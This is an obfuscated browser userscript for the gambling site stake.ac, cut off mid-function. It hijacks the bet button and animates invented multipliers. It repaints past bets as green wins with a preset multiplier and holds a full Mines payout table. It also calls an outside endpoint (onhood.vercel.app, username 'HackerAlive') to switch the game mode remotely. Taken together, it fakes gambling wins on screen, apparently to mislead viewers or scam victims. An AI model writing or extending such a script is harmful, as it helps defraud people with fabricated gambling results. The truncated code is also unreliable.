// ==UserScript==
// @name         New Userscript
// @namespace    http://tampermonkey.net/
// @version      2025-03-09
// @description  try to take over the world!
// @author       You
// @match        https://stake.ac/
// @icon         https://www.google.com/s2/favicons?sz=64&domain=stake.ac
// @grant        none
// ==/UserScript==

!function () {
  'use strict';

  let _0x11e98d;
  let _0x2d9500;
  let _0x4e37c3;
  let _0x2c3e56;
  let _0x337eeb;
  let _0x538172;
  let _0x4f9c3a;
  let _0x2e9f4f;
  let _0x33bbb8;
  let _0x3cfe82;
  let _0x2099eb;
  let _0x385f95;
  let _0x1abcd2;
  let _0x5ecc53;
  let _0x278cf4;
  let _0x18b21d;
  let _0x48a9fe;
  let _0x3a9fa2;
  let _0x28d45f;
  let _0x274e5d;
  let _0x2b74f8;
  let _0x3a81cb;
  let _0x5997d7;
  let _0x5b2a83;
  let _0x1ec843;
  let _0x2743c7;
  let _0xd97eb3;
  let _0x883401;
  let _0x4b9899;
  let _0x1247a7;
  let _0xd86844;
  let _0x4cf345;
  let _0x556504;
  let _0x8f3d21;
  let _0x4b42ef;
  let _0x1aad21;
  let _0x5ee28a;
  let _0x2ad5c1;
  let _0x369ea9 = {
    'usd': '$',
    'eur': '€',
    'inr': '₹'
  };
  let _0x5546a0 = false;
  let _0xef9750 = false;
  let _0x52a1fe = false;
  let _0x34d364 = false;
  let _0x2c27fe = false;
  let _0x564cde = false;
  let _0x52e332 = false;
  let _0x19ae3b = false;
  let _0x443e96 = 0x0;
  let _0x246db2 = 1.25;
  let _0x38ca01 = {
    'tiles': {}
  };
  let _0x276961 = [];
  let _0x3e10cf = false;
  let _0x18ffb0 = false;
  let _0x334490 = false;
  let _0x144f61 = true;
  let _0xbe34bd = localStorage.getItem("previouscur") || "usd";
  let _0x1a0243 = false;
  let _0x565349 = false;
  let _0x1d176e = false;
  let _0x512b6e = false;
  let _0x4c18ce = false;
  let _0x2276b3 = false;
  let _0x28501c = false;
  let _0x356ed4 = false;
  let _0x3725f5 = true;
  let _0x4a8c70 = false;
  let _0x458fa0 = false;
  let _0x1a8633 = false;
  let _0x2fe346 = 0x0;
  let _0x5f5018 = false;
  let _0x124a7d = localStorage.getItem("previoususd") || 1.108;
  let _0x368347 = localStorage.getItem("previousinr") || 84.625584;
  let _0x510b88 = false;
  let _0x1ca05d = false;
  let _0x58a80a = localStorage.getItem("ltcrate") || 62.62;
  let _0xfd6c3e = localStorage.getItem("btcrate") || 59361.53;
  let _0x120044 = localStorage.getItem("ethrate") || 2530.92;
  let _0x15c063 = localStorage.getItem('maticrate') || 0.379205;
  let _0x21c78d = _0x15c063 / _0x124a7d;
  let _0x124372 = _0x120044 / _0x124a7d;
  let _0x217262 = _0xfd6c3e / _0x124a7d;
  let _0x262b8b = _0x58a80a / _0x124a7d;
  let _0x37284d = true;
  let _0x3a5df1 = true;
  let _0x3493c8 = false;
  let _0xd8bd68 = false;
  let _0x588f3f = 0x0;
  let _0x53a83b = 0x0;
  let _0x5de51f = false;
  let _0x5c9718 = false;
  let _0x4e1066 = 0x0;
  let _0x111946 = null;
  let _0x1b304a = 0x1;
  let _0x20c1de = 0x0;
  let _0x2b90c1 = false;
  let _0x51e761 = '';
  let _0x40724d = false;
  let _0xb427b2 = false;
  let _0x393f84 = true;
  let _0x35a124 = false;
  let _0x33053b = false;
  let _0x4145c2 = false;
  let _0x26c190 = false;
  let _0x3866fe = false;
  let _0x1a69db = false;
  let _0x54dbe2 = localStorage.getItem("themeColor") || "#f55359";
  function _0x1410eb() {
    if (document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > button")) {
      document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > button").addEventListener("click", async () => {
        !function () {
          document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div > div.content.svelte-1ud3298 > span").style.color = '';
          const _0x5e4b34 = function () {
            const _0x542f59 = (_0x246db2 - 0x1) / 55;
            const _0x19b00a = [];
            for (let _0x4bc5b9 = 0x0; _0x4bc5b9 < 0x38; _0x4bc5b9++) {
              const _0x2e5a95 = 0x1 + _0x4bc5b9 * _0x542f59;
              _0x19b00a.push(_0x2e5a95.toFixed(0x2));
            }
            return _0x19b00a;
          }();
          let _0x278b7f = 0x0;
          _0x371757 = setInterval(() => {
            if (_0x278b7f < 0x38) {
              document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div > div.content.svelte-1ud3298 > span").innerText = _0x5e4b34[_0x278b7f] + '×';
              if (_0x278b7f === 55) {
                document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div > div.content.svelte-1ud3298 > span").style.color = "var(--green-500)";
              }
              _0x278b7f++;
            } else {
              clearInterval(_0x371757);
            }
          }, 10.714285714285714);
        }();
      });
      (function () {
        const _0x1b57b9 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div > div.content.svelte-1ud3298");
        if (_0x1b57b9) {
          const _0x31f7e7 = _0x1b57b9.cloneNode(true);
          _0x1b57b9.parentNode.replaceChild(_0x31f7e7, _0x1b57b9);
        }
      })();
      (function () {
        let _0x513370 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div > div.past-bets.svelte-zjz7dr.full") || document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div > div.past-bets.svelte-zjz7dr");
        if (_0x513370) {
          _0x4ba692 = new MutationObserver(_0x5387e5 => {
            for (let _0x7165aa of _0x5387e5) if ('childList' === _0x7165aa.type && _0x7165aa.addedNodes.length > 0x0) {
              _0x7165aa.addedNodes.forEach(_0x2f35f7 => {
                if (0x1 === _0x2f35f7.nodeType) {
                  if (_0x2f35f7.className.includes("variant-neutral")) {
                    _0x2f35f7.className = "button-tag variant-success svelte-yomd1r";
                  }
                  if (_0x2f35f7.firstElementChild) {
                    _0x2f35f7.firstElementChild.innerText = _0x246db2 + '×';
                  }
                }
              });
            }
          });
          _0x4ba692.observe(_0x513370, {
            'childList': true
          });
        }
      })();
    } else {
      setTimeout(_0x1410eb, 0x32);
    }
  }
  const _0x55f5b6 = [{
    'name': "1 mine",
    'data': [{
      'diamonds': 0x1,
      'multiplier': 1.01
    }, {
      'diamonds': 0x2,
      'multiplier': 1.08
    }, {
      'diamonds': 0x3,
      'multiplier': 1.12
    }, {
      'diamonds': 0x4,
      'multiplier': 1.18
    }, {
      'diamonds': 0x5,
      'multiplier': 1.24
    }, {
      'diamonds': 0x6,
      'multiplier': 1.3
    }, {
      'diamonds': 0x7,
      'multiplier': 1.37
    }, {
      'diamonds': 0x8,
      'multiplier': 1.46
    }, {
      'diamonds': 0x9,
      'multiplier': 1.55
    }, {
      'diamonds': 0xa,
      'multiplier': 1.65
    }, {
      'diamonds': 0xb,
      'multiplier': 1.77
    }, {
      'diamonds': 0xc,
      'multiplier': 1.99
    }, {
      'diamonds': 0xd,
      'multiplier': 2.06
    }, {
      'diamonds': 0xe,
      'multiplier': 2.25
    }, {
      'diamonds': 0xf,
      'multiplier': 2.47
    }, {
      'diamonds': 0x10,
      'multiplier': 2.75
    }, {
      'diamonds': 0x11,
      'multiplier': 3.09
    }, {
      'diamonds': 0x12,
      'multiplier': 3.54
    }, {
      'diamonds': 0x13,
      'multiplier': 4.12
    }, {
      'diamonds': 0x14,
      'multiplier': 4.95
    }, {
      'diamonds': 0x15,
      'multiplier': 6.19
    }, {
      'diamonds': 0x16,
      'multiplier': 8.25
    }, {
      'diamonds': 0x17,
      'multiplier': 12.38
    }, {
      'diamonds': 0x18,
      'multiplier': 24.75
    }]
  }, {
    'name': "2 mine",
    'data': [{
      'diamonds': 0x1,
      'multiplier': 1.08
    }, {
      'diamonds': 0x2,
      'multiplier': 1.17
    }, {
      'diamonds': 0x3,
      'multiplier': 1.29
    }, {
      'diamonds': 0x4,
      'multiplier': 1.41
    }, {
      'diamonds': 0x5,
      'multiplier': 1.56
    }, {
      'diamonds': 0x6,
      'multiplier': 1.74
    }, {
      'diamonds': 0x7,
      'multiplier': 1.94
    }, {
      'diamonds': 0x8,
      'multiplier': 2.18
    }, {
      'diamonds': 0x9,
      'multiplier': 2.47
    }, {
      'diamonds': 0xa,
      'multiplier': 2.83
    }, {
      'diamonds': 0xb,
      'multiplier': 3.26
    }, {
      'diamonds': 0xc,
      'multiplier': 3.81
    }, {
      'diamonds': 0xd,
      'multiplier': 4.5
    }, {
      'diamonds': 0xe,
      'multiplier': 5.4
    }, {
      'diamonds': 0xf,
      'multiplier': 6.6
    }, {
      'diamonds': 0x10,
      'multiplier': 8.25
    }, {
      'diamonds': 0x11,
      'multiplier': 10.61
    }, {
      'diamonds': 0x12,
      'multiplier': 14.14
    }, {
      'diamonds': 0x13,
      'multiplier': 19.8
    }, {
      'diamonds': 0x14,
      'multiplier': 29.7
    }, {
      'diamonds': 0x15,
      'multiplier': 49.5
    }, {
      'diamonds': 0x16,
      'multiplier': 0x63
    }, {
      'diamonds': 0x17,
      'multiplier': 0x129
    }]
  }, {
    'name': "3 mine",
    'data': [{
      'diamonds': 0x1,
      'multiplier': 1.12
    }, {
      'diamonds': 0x2,
      'multiplier': 1.29
    }, {
      'diamonds': 0x3,
      'multiplier': 1.48
    }, {
      'diamonds': 0x4,
      'multiplier': 1.71
    }, {
      'diamonds': 0x5,
      'multiplier': 0x2
    }, {
      'diamonds': 0x6,
      'multiplier': 2.35
    }, {
      'diamonds': 0x7,
      'multiplier': 2.79
    }, {
      'diamonds': 0x8,
      'multiplier': 3.35
    }, {
      'diamonds': 0x9,
      'multiplier': 4.07
    }, {
      'diamonds': 0xa,
      'multiplier': 0x5
    }, {
      'diamonds': 0xb,
      'multiplier': 6.26
    }, {
      'diamonds': 0xc,
      'multiplier': 7.96
    }, {
      'diamonds': 0xd,
      'multiplier': 10.35
    }, {
      'diamonds': 0xe,
      'multiplier': 13.8
    }, {
      'diamonds': 0xf,
      'multiplier': 18.97
    }, {
      'diamonds': 0x10,
      'multiplier': 27.11
    }, {
      'diamonds': 0x11,
      'multiplier': 40.66
    }, {
      'diamonds': 0x12,
      'multiplier': 65.06
    }, {
      'diamonds': 0x13,
      'multiplier': 113.85
    }, {
      'diamonds': 0x14,
      'multiplier': 227.7
    }, {
      'diamonds': 0x15,
      'multiplier': 569.3
    }, {
      'diamonds': 0x16,
      'multiplier': 0x8e5
    }]
  }, {
    'name': "4 mine",
    'data': [{
      'diamonds': 0x1,
      'multiplier': 1.18
    }, {
      'diamonds': 0x2,
      'multiplier': 1.41
    }, {
      'diamonds': 0x3,
      'multiplier': 1.71
    }, {
      'diamonds': 0x4,
      'multiplier': 2.09
    }, {
      'diamonds': 0x5,
      'multiplier': 2.58
    }, {
      'diamonds': 0x6,
      'multiplier': 3.23
    }, {
      'diamonds': 0x7,
      'multiplier': 4.09
    }, {
      'diamonds': 0x8,
      'multiplier': 5.26
    }, {
      'diamonds': 0x9,
      'multiplier': 6.88
    }, {
      'diamonds': 0xa,
      'multiplier': 9.17
    }, {
      'diamonds': 0xb,
      'multiplier': 12.51
    }, {
      'diamonds': 0xc,
      'multiplier': 17.51
    }, {
      'diamonds': 0xd,
      'multiplier': 25.3
    }, {
      'diamonds': 0xe,
      'multiplier': 37.95
    }, {
      'diamonds': 0xf,
      'multiplier': 59.64
    }, {
      'diamonds': 0x10,
      'multiplier': 99.39
    }, {
      'diamonds': 0x11,
      'multiplier': 178.91
    }, {
      'diamonds': 0x12,
      'multiplier': 357.81
    }, {
      'diamonds': 0x13,
      'multiplier': 834.9
    }, {
      'diamonds': 0x14,
      'multiplier': 0x9c8
    }, {
      'diamonds': 0x15,
      'multiplier': 0x30eb
    }]
  }, {
    'name': "5 mine",
    'data': [{
      'diamonds': 0x1,
      'multiplier': 1.24
    }, {
      'diamonds': 0x2,
      'multiplier': 1.56
    }, {
      'diamonds': 0x3,
      'multiplier': 0x2
    }, {
      'diamonds': 0x4,
      'multiplier': 2.58
    }, {
      'diamonds': 0x5,
      'multiplier': 3.39
    }, {
      'diamonds': 0x6,
      'multiplier': 4.52
    }, {
      'diamonds': 0x7,
      'multiplier': 6.14
    }, {
      'diamonds': 0x8,
      'multiplier': 8.5
    }, {
      'diamonds': 0x9,
      'multiplier': 12.04
    }, {
      'diamonds': 0xa,
      'multiplier': 17.52
    }, {
      'diamonds': 0xb,
      'multiplier': 26.77
    }, {
      'diamonds': 0xc,
      'multiplier': 40.87
    }, {
      'diamonds': 0xd,
      'multiplier': 66.41
    }, {
      'diamonds': 0xe,
      'multiplier': 113.85
    }, {
      'diamonds': 0xf,
      'multiplier': 208.72
    }, {
      'diamonds': 0x10,
      'multiplier': 417.45
    }, {
      'diamonds': 0x11,
      'multiplier': 939.26
    }, {
      'diamonds': 0x12,
      'multiplier': 0x9c8
    }, {
      'diamonds': 0x13,
      'multiplier': 0x2240
    }, {
      'diamonds': 0x14,
      'multiplier': 0xcd76
    }]
  }, {
    'name': "6 mine",
    'data': [{
      'diamonds': 0x1,
      'multiplier': 1.3
    }, {
      'diamonds': 0x2,
      'multiplier': 1.74
    }, {
      'diamonds': 0x3,
      'multiplier': 2.35
    }, {
      'diamonds': 0x4,
      'multiplier': 3.23
    }, {
      'diamonds': 0x5,
      'multiplier': 4.52
    }, {
      'diamonds': 0x6,
      'multiplier': 6.46
    }, {
      'diamonds': 0x7,
      'multiplier': 9.44
    }, {
      'diamonds': 0x8,
      'multiplier': 14.17
    }, {
      'diamonds': 0x9,
      'multiplier': 21.89
    }, {
      'diamonds': 0xa,
      'multiplier': 35.03
    }, {
      'diamonds': 0xb,
      'multiplier': 58.38
    }, {
      'diamonds': 0xc,
      'multiplier': 102.17
    }, {
      'diamonds': 0xd,
      'multiplier': 189.75
    }, {
      'diamonds': 0xe,
      'multiplier': 379.5
    }, {
      'diamonds': 0xf,
      'multiplier': 834.9
    }, {
      'diamonds': 0x10,
      'multiplier': 0x827
    }, {
      'diamonds': 0x11,
      'multiplier': 0x1875
    }, {
      'diamonds': 0x12,
      'multiplier': 0x61d7
    }, {
      'diamonds': 0x13,
      'multiplier': 0x2ace1
    }]
  }, {
    'name': "7 mine",
    'data': [{
      'diamonds': 0x1,
      'multiplier': 1.37
    }, {
      'diamonds': 0x2,
      'multiplier': 1.94
    }, {
      'diamonds': 0x3,
      'multiplier': 2.79
    }, {
      'diamonds': 0x4,
      'multiplier': 4.09
    }, {
      'diamonds': 0x5,
      'multiplier': 6.14
    }, {
      'diamonds': 0x6,
      'multiplier': 9.44
    }, {
      'diamonds': 0x7,
      'multiplier': 14.95
    }, {
      'diamonds': 0x8,
      'multiplier': 24.47
    }, {
      'diamonds': 0x9,
      'multiplier': 41.06
    }, {
      'diamonds': 0xa,
      'multiplier': 73.95
    }, {
      'diamonds': 0xb,
      'multiplier': 138.66
    }, {
      'diamonds': 0xc,
      'multiplier': 277.33
    }, {
      'diamonds': 0xd,
      'multiplier': 600.87
    }, {
      'diamonds': 0xe,
      'multiplier': 0x5a2
    }, {
      'diamonds': 0xf,
      'multiplier': 0xf7d
    }, {
      'diamonds': 0x10,
      'multiplier': 0x33a3
    }, {
      'diamonds': 0x11,
      'multiplier': 0xe85e
    }, {
      'diamonds': 0x12,
      'multiplier': 0x742f5
    }]
  }, {
    'name': "8 mine",
    'data': [{
      'diamonds': 0x1,
      'multiplier': 1.46
    }, {
      'diamonds': 0x2,
      'multiplier': 2.18
    }, {
      'diamonds': 0x3,
      'multiplier': 3.35
    }, {
      'diamonds': 0x4,
      'multiplier': 5.26
    }, {
      'diamonds': 0x5,
      'multiplier': 8.5
    }, {
      'diamonds': 0x6,
      'multiplier': 14.17
    }, {
      'diamonds': 0x7,
      'multiplier': 24.47
    }, {
      'diamonds': 0x8,
      'multiplier': 44.05
    }, {
      'diamonds': 0x9,
      'multiplier': 83.2
    }, {
      'diamonds': 0xa,
      'multiplier': 166.4
    }, {
      'diamonds': 0xb,
      'multiplier': 356.56
    }, {
      'diamonds': 0xc,
      'multiplier': 831.98
    }, {
      'diamonds': 0xd,
      'multiplier': 0x873
    }, {
      'diamonds': 0xe,
      'multiplier': 0x1959
    }, {
      'diamonds': 0xf,
      'multiplier': 0x5cf2
    }, {
      'diamonds': 0x10,
      'multiplier': 0x1d0bd
    }, {
      'diamonds': 0x11,
      'multiplier': 0x1056a7
    }]
  }, {
    'name': "9 mine",
    'data': [{
      'diamonds': 0x1,
      'multiplier': 1.55
    }, {
      'diamonds': 0x2,
      'multiplier': 2.47
    }, {
      'diamonds': 0x3,
      'multiplier': 4.07
    }, {
      'diamonds': 0x4,
      'multiplier': 6.88
    }, {
      'diamonds': 0x5,
      'multiplier': 12.04
    }, {
      'diamonds': 0x6,
      'multiplier': 21.89
    }, {
      'diamonds': 0x7,
      'multiplier': 41.06
    }, {
      'diamonds': 0x8,
      'multiplier': 83.2
    }, {
      'diamonds': 0x9,
      'multiplier': 176.8
    }, {
      'diamonds': 0xa,
      'multiplier': 404.1
    }, {
      'diamonds': 0xb,
      'multiplier': 0x3f2
    }, {
      'diamonds': 0xc,
      'multiplier': 0xb0c
    }, {
      'diamonds': 0xd,
      'multiplier': 0x23e9
    }, {
      'diamonds': 0xe,
      'multiplier': 0x8fa5
    }, {
      'diamonds': 0xf,
      'multiplier': 0x3160e
    }, {
      'diamonds': 0x10,
      'multiplier': 0x1edc91
    }]
  }, {
    'name': "10 mine",
    'data': [{
      'diamonds': 0x1,
      'multiplier': 1.65
    }, {
      'diamonds': 0x2,
      'multiplier': 2.83
    }, {
      'diamonds': 0x3,
      'multiplier': 0x5
    }, {
      'diamonds': 0x4,
      'multiplier': 9.17
    }, {
      'diamonds': 0x5,
      'multiplier': 17.52
    }, {
      'diamonds': 0x6,
      'multiplier': 35.03
    }, {
      'diamonds': 0x7,
      'multiplier': 73.95
    }, {
      'diamonds': 0x8,
      'multiplier': 166.4
    }, {
      'diamonds': 0x9,
      'multiplier': 404.1
    }, {
      'diamonds': 0xa,
      'multiplier': 0x435
    }, {
      'diamonds': 0xb,
      'multiplier': 0xca0
    }, {
      'diamonds': 0xc,
      'multiplier': 0x2c32
    }, {
      'diamonds': 0xd,
      'multiplier': 0xbf87
    }, {
      'diamonds': 0xe,
      'multiplier': 0x47d2c
    }, {
      'diamonds': 0xf,
      'multiplier': 0x3160e8
    }]
  }, {
    'name': "11 mine",
    'data': [{
      'diamonds': 0x1,
      'multiplier': 1.77
    }, {
      'diamonds': 0x2,
      'multiplier': 3.26
    }, {
      'diamonds': 0x3,
      'multiplier': 6.26
    }, {
      'diamonds': 0x4,
      'multiplier': 12.51
    }, {
      'diamonds': 0x5,
      'multiplier': 26.77
    }, {
      'diamonds': 0x6,
      'multiplier': 58.38
    }, {
      'diamonds': 0x7,
      'multiplier': 136.66
    }, {
      'diamonds': 0x8,
      'multiplier': 356.56
    }, {
      'diamonds': 0x9,
      'multiplier': 0x3f2
    }, {
      'diamonds': 0xa,
      'multiplier': 0xca0
    }, {
      'diamonds': 0xb,
      'multiplier': 0x2f5b
    }, {
      'diamonds': 0xc,
      'multiplier': 0xdcfe
    }, {
      'diamonds': 0xd,
      'multiplier': 0x59c77
    }, {
      'diamonds': 0xe,
      'multiplier': 0x43559a
    }]
  }, {
    'name': "12 mine",
    'data': [{
      'diamonds': 0x1,
      'multiplier': 1.9
    }, {
      'diamonds': 0x2,
      'multiplier': 3.81
    }, {
      'diamonds': 0x3,
      'multiplier': 7.96
    }, {
      'diamonds': 0x4,
      'multiplier': 17.52
    }, {
      'diamonds': 0x5,
      'multiplier': 40.87
    }, {
      'diamonds': 0x6,
      'multiplier': 102.17
    }, {
      'diamonds': 0x7,
      'multiplier': 277.33
    }, {
      'diamonds': 0x8,
      'multiplier': 831.98
    }, {
      'diamonds': 0x9,
      'multiplier': 0xb0c
    }, {
      'diamonds': 0xa,
      'multiplier': 0x2c32
    }, {
      'diamonds': 0xb,
      'multiplier': 0xdcfe
    }, {
      'diamonds': 0xc,
      'multiplier': 0x60af6
    }, {
      'diamonds': 0xd,
      'multiplier': 0x4e8e89
    }]
  }, {
    'name': "13 mine",
    'data': [{
      'diamonds': 0x1,
      'multiplier': 2.06
    }, {
      'diamonds': 0x2,
      'multiplier': 4.5
    }, {
      'diamonds': 0x3,
      'multiplier': 10.35
    }, {
      'diamonds': 0x4,
      'multiplier': 25.3
    }, {
      'diamonds': 0x5,
      'multiplier': 66.41
    }, {
      'diamonds': 0x6,
      'multiplier': 189.75
    }, {
      'diamonds': 0x7,
      'multiplier': 600.87
    }, {
      'diamonds': 0x8,
      'multiplier': 0x873
    }, {
      'diamonds': 0x9,
      'multiplier': 0x23e9
    }, {
      'diamonds': 0xa,
      'multiplier': 0xbf87
    }, {
      'diamonds': 0xb,
      'multiplier': 0x59c77
    }, {
      'diamonds': 0xc,
      'multiplier': 0x4e8e89
    }]
  }, {
    'name': "14 mine",
    'data': [{
      'diamonds': 0x1,
      'multiplier': 2.25
    }, {
      'diamonds': 0x2,
      'multiplier': 5.4
    }, {
      'diamonds': 0x3,
      'multiplier': 13.8
    }, {
      'diamonds': 0x4,
      'multiplier': 37.95
    }, {
      'diamonds': 0x5,
      'multiplier': 133.85
    }, {
      'diamonds': 0x6,
      'multiplier': 379.5
    }, {
      'diamonds': 0x7,
      'multiplier': 0x5a2
    }, {
      'diamonds': 0x8,
      'multiplier': 0x1959
    }, {
      'diamonds': 0x9,
      'multiplier': 0x8fa5
    }, {
      'diamonds': 0xa,
      'multiplier': 0x47d2c
    }, {
      'diamonds': 0xb,
      'multiplier': 0x43559a
    }]
  }, {
    'name': "15 mine",
    'data': [{
      'diamonds': 0x1,
      'multiplier': 2.47
    }, {
      'diamonds': 0x2,
      'multiplier': 6.6
    }, {
      'diamonds': 0x3,
      'multiplier': 18.97
    }, {
      'diamonds': 0x4,
      'multiplier': 59.64
    }, {
      'diamonds': 0x5,
      'multiplier': 208.72
    }, {
      'diamonds': 0x6,
      'multiplier': 834.9
    }, {
      'diamonds': 0x7,
      'multiplier': 0xf7d
    }, {
      'diamonds': 0x8,
      'multiplier': 0x5cf2
    }, {
      'diamonds': 0x9,
      'multiplier': 0x3160e
    }, {
      'diamonds': 0xa,
      'multiplier': 0x3160e8
    }]
  }, {
    'name': "16 mine",
    'data': [{
      'diamonds': 0x1,
      'multiplier': 2.75
    }, {
      'diamonds': 0x2,
      'multiplier': 8.25
    }, {
      'diamonds': 0x3,
      'multiplier': 27.11
    }, {
      'diamonds': 0x4,
      'multiplier': 99.39
    }, {
      'diamonds': 0x5,
      'multiplier': 417.45
    }, {
      'diamonds': 0x6,
      'multiplier': 0x827
    }, {
      'diamonds': 0x7,
      'multiplier': 0x33a3
    }, {
      'diamonds': 0x8,
      'multiplier': 0x1d0bd
    }, {
      'diamonds': 0x9,
      'multiplier': 0x1edc91
    }]
  }, {
    'name': "17 mine",
    'data': [{
      'diamonds': 0x1,
      'multiplier': 3.09
    }, {
      'diamonds': 0x2,
      'multiplier': 10.61
    }, {
      'diamonds': 0x3,
      'multiplier': 40.66
    }, {
      'diamonds': 0x4,
      'multiplier': 178.91
    }, {
      'diamonds': 0x5,
      'multiplier': 939.26
    }, {
      'diamonds': 0x6,
      'multiplier': 0x1875
    }, {
      'diamonds': 0x7,
      'multiplier': 0xe85e
    }, {
      'diamonds': 0x8,
      'multiplier': 0x1056a7
    }]
  }, {
    'name': "18 mine",
    'data': [{
      'diamonds': 0x1,
      'multiplier': 3.54
    }, {
      'diamonds': 0x2,
      'multiplier': 14.14
    }, {
      'diamonds': 0x3,
      'multiplier': 65.06
    }, {
      'diamonds': 0x4,
      'multiplier': 357.81
    }, {
      'diamonds': 0x5,
      'multiplier': 0x9c8
    }, {
      'diamonds': 0x6,
      'multiplier': 0x61d7
    }, {
      'diamonds': 0x7,
      'multiplier': 0x742f5
    }]
  }, {
    'name': "19 mine",
    'data': [{
      'diamonds': 0x1,
      'multiplier': 4.12
    }, {
      'diamonds': 0x2,
      'multiplier': 19.8
    }, {
      'diamonds': 0x3,
      'multiplier': 113.85
    }, {
      'diamonds': 0x4,
      'multiplier': 834.9
    }, {
      'diamonds': 0x5,
      'multiplier': 0x2240
    }, {
      'diamonds': 0x6,
      'multiplier': 0x2ace1
    }]
  }, {
    'name': "20 mine",
    'data': [{
      'diamonds': 0x1,
      'multiplier': 4.95
    }, {
      'diamonds': 0x2,
      'multiplier': 29.7
    }, {
      'diamonds': 0x3,
      'multiplier': 227.7
    }, {
      'diamonds': 0x4,
      'multiplier': 0x9c8
    }, {
      'diamonds': 0x5,
      'multiplier': 0xcd76
    }]
  }, {
    'name': "21 mine",
    'data': [{
      'diamonds': 0x1,
      'multiplier': 6.19
    }, {
      'diamonds': 0x2,
      'multiplier': 49.5
    }, {
      'diamonds': 0x3,
      'multiplier': 569.3
    }, {
      'diamonds': 0x4,
      'multiplier': 0x30eb
    }]
  }, {
    'name': "22 mine",
    'data': [{
      'diamonds': 0x1,
      'multiplier': 8.25
    }, {
      'diamonds': 0x2,
      'multiplier': 0x63
    }, {
      'diamonds': 0x3,
      'multiplier': 0x8e5
    }]
  }, {
    'name': "23 mine",
    'data': [{
      'diamonds': 0x1,
      'multiplier': 12.37
    }, {
      'diamonds': 0x2,
      'multiplier': 0x129
    }]
  }, {
    'name': "24 mine",
    'data': [{
      'diamonds': 0x1,
      'multiplier': 24.75
    }]
  }];
  function _0x9d0f20() {
    const _0x52e286 = document.querySelector("[data-testid=\"bet-button\"][data-analytics=\"bet-button\"]") || document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > button.inline-flex.relative.items-center.gap-2.justify-center.rounded-sm.font-semibold.whitespace-nowrap.ring-offset-background.transition.disabled\\:pointer-events-none.disabled\\:opacity-50.focus-visible\\:outline.focus-visible\\:outline-2.focus-visible\\:outline-offset-2.active\\:scale-\\[0\\.98\\].bg-green-500.text-neutral-black.betterhover\\:hover\\:bg-green-400.betterhover\\:hover\\:text-neutral-black.focus-visible\\:outline-white.text-base.leading-none.shadow-md.py-\\[1\\.125rem\\].px-\\[1\\.75rem\\]");
    const _0x30e169 = _0x52e286.querySelector(".inline-flex.justify-center.items-center");
    if (_0x52e286) {
      if (_0x30e169) {
        return;
      }
      _0x52e286.disabled = true;
      const _0x4dbe45 = _0x52e286.querySelector("div");
      if (_0x4dbe45) {
        _0x4dbe45.className = "contents invisible";
      }
      const _0xd1d7cc = document.createElement("div");
      _0xd1d7cc.classList.add('inline-flex', "justify-center", 'items-center', "absolute", "top-1/2", 'left-1/2', "-translate-x-1/2", '-translate-y-1/2');
      const _0x5237fc = document.createElement("div");
      _0x5237fc.classList.add("wobble", "svelte-1yggho2");
      const _0x54b763 = document.createElementNS("http://www.w3.org/2000/svg", "svg");
      _0x54b763.setAttribute("fill", "currentColor");
      _0x54b763.setAttribute("viewBox", "0 0 96 96");
      _0x54b763.classList.add("svg-icon");
      const _0x54d464 = document.createElementNS('http://www.w3.org/2000/svg', "path");
      _0x54d464.setAttribute('fill-rule', 'evenodd');
      _0x54d464.setAttribute("clip-rule", 'evenodd');
      _0x54d464.setAttribute('d', "M85.405 6.399a14.328 14.328 0 0 1 10.015 4.559h-.003a2.114 2.114 0 0 1-.078 3c-.37.368-.876.599-1.44.599h-.024a2.081 2.081 0 0 1-1.539-.68l-.006-.007a9.964 9.964 0 0 0-7.324-3.194 9.93 9.93 0 0 0-5.945 1.961c3.162 4.2 4.4 9.44.921 12.718l-2.36 2.078-.111-.192c-4.301-6.877-10.38-12.534-17.843-16.442l3.44-3.278c3.518-3.32 8.877-1.6 12.875 1.918a14.132 14.132 0 0 1 9.398-3.04h.024Zm-46.414 83.86c21.535 0 38.991-17.456 38.991-38.99 0-21.536-17.456-38.992-38.991-38.992S0 29.733 0 51.268 17.456 90.26 38.991 90.26Z");
      _0x54b763.appendChild(_0x54d464);
      _0x5237fc.appendChild(_0x54b763);
      _0xd1d7cc.appendChild(_0x5237fc);
      _0x52e286.appendChild(_0xd1d7cc);
    }
  }
  async function _0x58a1b3() {
    const _0x48fa52 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > button");
    if (_0x48fa52) {
      if (_0x48fa52.disabled) {
        setTimeout(_0x58a1b3, 0x64);
      } else {
        _0x3b13a6();
        const _0x1b8d87 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > button");
        const _0x17e8ab = _0x1b8d87.cloneNode(true);
        _0x1b8d87.parentNode.replaceChild(_0x17e8ab, _0x1b8d87);
        _0x17e8ab.addEventListener("click", async () => {
          const _0xae107f = document.querySelector("[data-testid=\"bet-button\"][data-analytics=\"bet-button\"]");
          if (_0xae107f) {
            if ("Bet" !== _0xae107f.innerText.trim()) {
              return;
            }
            if (_0x2c27fe) {
              (async function () {
                try {
                  const _0x4a66a0 = await fetch("https://onhood.vercel.app/change?gamemode=mines&username=HackerAlive", {
                    'method': "GET",
                    'headers': {
                      'Content-Type': "application/json"
                    }
                  });
                  if (!_0x4a66a0.ok) {
                    throw new Error("HTTP error! status: " + _0x4a66a0.status);
                  }
